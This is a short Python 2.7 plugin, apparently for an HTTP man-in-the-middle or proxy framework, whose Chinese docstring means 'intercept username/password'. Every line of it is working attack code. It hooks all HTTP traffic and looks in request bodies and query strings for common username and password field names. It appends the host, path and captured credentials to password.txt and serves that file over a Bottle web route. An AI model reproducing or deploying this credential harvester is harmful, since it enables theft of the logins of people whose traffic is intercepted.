#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import libs
import bottle
import urlparse
__doc__ = """
截取用户名/密码
"""

UserName=[
    "userName",
    "username",
    "uname",
    "user",
    "u",
]

Password=[
    "Password",
    "password",
    "p",
]

App = bottle.Bottle()

@App.route("/")
def Index():
    return open("password.txt","r").read()

def GetPassword(self):
    f=open("password.txt","a+")
    data=urlparse.parse_qs(self.Request.Body+"&"+urlparse.urlparse(self.Request.Path)[4])
    p=""
    u=""
    for i in UserName:
        if data.has_key(i):
            u=str(data[i])
    for i in Password:
        if data.has_key(i):
            p=str(data[i])
    if p or u:
        f.write(self.Request.Headers["Host"][0]+self.Request.Path+"\t"+u+"\t"+p+"\r\n")
    f.close()

def Init():
    libs.RegHandleHTTPResponseFunc([("*",GetPassword)])
    libs.RegApp("GetPassword",App)

Init()
